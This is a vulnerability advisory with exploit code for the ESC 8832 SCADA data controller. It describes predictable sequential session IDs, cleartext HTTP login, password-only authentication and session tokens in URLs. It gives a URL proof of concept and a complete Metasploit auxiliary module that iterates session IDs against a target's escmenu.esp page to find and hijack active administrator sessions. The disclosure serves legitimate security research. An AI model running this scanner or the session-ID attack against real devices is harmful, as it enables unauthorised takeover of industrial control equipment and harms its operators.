=begin
# Exploit Title: ESC 8832 Data Controller multiple vulnerabilities
# Date: 2014-05-29
# Platform: SCADA / Web Application
# Exploit Author: Balazs Makany
# Vendor Homepage: www.envirosys.com
# Version: ESC 8832 Data Controller Hardware
# Tested on: ESC 8832 Data Controller Hardware
# CVE : N/A (Yet)

POC for session hijacking: From the attacker browser (unauthenticated),
simply enter the following URL:
http://IP_of_the_Device/escmenu.esp?sessionid=1&menuid=6 and increment the
sessionid parameter, starting from 1 up until it makes sense.

POC (and other vulns as well) was confirmed by the vendor
Metasploit auxiliary module available at
https://www.th3r3g3nt.com/public_files/esc_8832_session.rb

Details
[1] Insecure user session handling (Session Hijacking)
Summary: This vulnerability allows an attacker to hijack a valid session
that is in progress by a legitimate user.
Details: Due to the predictable session generation and due to the lack of
cookie based authentication in the web interface, it was confirmed that an
attacker from a different source IP address can issue valid requests,
impersonating the authenticated user. The attack complexity is very low, no
special software is required. It was noted that valid sessions do time out
after certain period of inactivity, however hijacked sessions can
elongating the session validity.
Impact: The attacker can bypass intended access restrictions and
impersonate currently active users, including administrators. Successful
exploitation will result in complete loss of control over the device, and
may depend on the compromised user context.
POC: From a browser, simply enter the following URL:
http://IP_of_the_Device/escmenu.esp?sessionid=1&menuid=6 and modify the
sessionid parameter, starting from 1 up until it makes sense. Typically 15
is high enough.

[2] Insecure user session generation (Predictable user session generation)
Summary: This vulnerability aids attackers to perform session hijacking
Details: Upon successful authentication, the generated session ID are
sequential in nature and starts at 1. For example if no user is
authenticated, the first user who authenticates will receive the session ID
1. The next authenticated user will receive session ID 2 and so on. There
is also seems to be a “read-only” / unknown behavior when user ID 0 is
supplied. Negative, invalid and other fuzzable values were not tested.
Impact: Successful exploitation will allow remote attackers to determine
valid sessions, leading to session hijacking and can result in complete
loss of control over the device.
POC: N/A, confirmed by vendor

[3] Insecure user authentication method (Unencrypted protocol)
Summary: This vulnerability allows man-in-the-middle attackers to gain
valid cleartext credentials
Details: The device is only capable of HTTP based authentication, which
doesn’t seem to offer encryption such as HTTPS. Note that the native
end-point client shipped with the device was not tested.
Impact: Man-in-the-middle attackers are able to sniff cleartext
authentication credentials between the user and the device. Successful
exploitation may result in partial or complete loss of control over the
device, depending on the compromised user context.
POC: N/A, see web interface open ports and protocols

[4] Insecure user management (Lack of user names)
Summary: This vulnerability significantly decreases the complexity
requirements for bruteforce attacks
Details: The web interface does not require a username to be entered in
conjunction with the password; only the password drives the user role.
Impact: Attackers can have significantly higher success rate for password
bruteforcing. Successful exploitation may result in partial or complete
loss of control over the device, depending on the compromised user context.
POC: N/A, confirmed by vendor, inspect login screen

[5] Insecure user session token transmission (Session token in HTTP GET)
Summary: Session tokens are transmitted via HTTP GET request in unhashed
form
Details: Upon successful authentication, the session ID is being sent in
the URL GET request. (http[nolink]://
192.168.1.1/escmenu.esp?sessionid=1&menuid=6)
Impact: Man-in-the-middle attackers and caching devices (proxies, routers
with spanning ports, loggers, browser history, IDS/IPS etc.) can
effectively capture valid session IDs. The session ID transmitted in the
GET request is vulnerable to session hijacking. Successful exploitation may
result in partial or complete loss of control over the device, depending on
the compromised user context.
POC: N/A, confirmed by vendor
=end

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'ESC 8832 Data Controller Session Hijack Scanner',
      'Description' => %q{ This module detects if an active session is present and hijackable on the target ESC 8832 web interface.},
      'Author'      => ['Balazs Makany'],
      'References'  =>
      [
        ['URL', 'https://www.th3r3g3nt.com/?p=28'],
      ],
      'License'     => MSF_LICENSE
    ))

    register_options([
        Opt::RPORT(80),
        OptBool.new('STOP_ON_SUCCESS', [true, "Stop when a live session was found", true]),
    ])
    deregister_options('RHOST')
  end

  def run_host(target_host)
        result = []
        begin
                ('1'.. '15').each do |u|
                print_status("Scanning #{target_host} - with Session ID '#{u}'")

                #Just to be on the safe side here.
                sleep(1)

                res = send_request_raw({
                'uri'     => '/escmenu.esp?sessionid='+u+'&menuid=6',
                'method'  => 'GET',
                'headers' => { 'Connection' => 'Close' }
                }, 25)

                if (res and res.code == 200 and res.body)
                    if res.body.match(/(Configuration\sMenu)/im)
                        print_good("#{target_host} - Active Session found as #{u}!")
                        print_good("Complete request: http://#{target_host}/escmenu.esp?sessionid=#{u}&menuid=6")
                        report_vuln(
                         {
                            :host  => target_host,
                            :port  => datastore['RPORT'],
                            :name  => "ESC 8832 Web Vulnerability",
                            :info  => "Module #{self.fullname} confirmed a valid session (#{u}) on the ESC 8832 Web Interface",
                         }
                        )
                        break if datastore['STOP_ON_SUCCESS']
                    end
                    if res.body.match(/(Access\sDenied!)/im)
                        print_status("  Dead session")
                    end
                end
        end

        rescue ::Interrupt
                raise $!
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
                print_error("Timeout or no connection on #{rhost}:#{rport}")
                return
        rescue ::Exception => e
                print_error("#{rhost}:#{rport} Error: #{e.class} #{e} #{e.backtrace}")
                return
   end
end
end